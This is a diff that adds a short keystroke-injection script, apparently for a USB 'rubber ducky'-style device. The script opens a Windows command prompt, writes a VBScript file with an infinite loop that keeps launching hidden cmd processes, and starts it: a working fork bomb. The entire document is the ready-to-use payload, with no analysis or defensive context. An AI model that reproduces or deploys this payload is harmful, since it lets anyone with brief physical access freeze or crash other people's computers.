@@ -1,0 +1,18 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING copy con forkb.vbs
+ENTER
+STRING do
+ENTER
+STRING CreateObject("Wscript.Shell").Run "cmd", 0, False
+ENTER
+STRING loop
+CTRL z
+ENTER
+DELAY 50
+STRING start forkb.vbs && exit
+ENTER
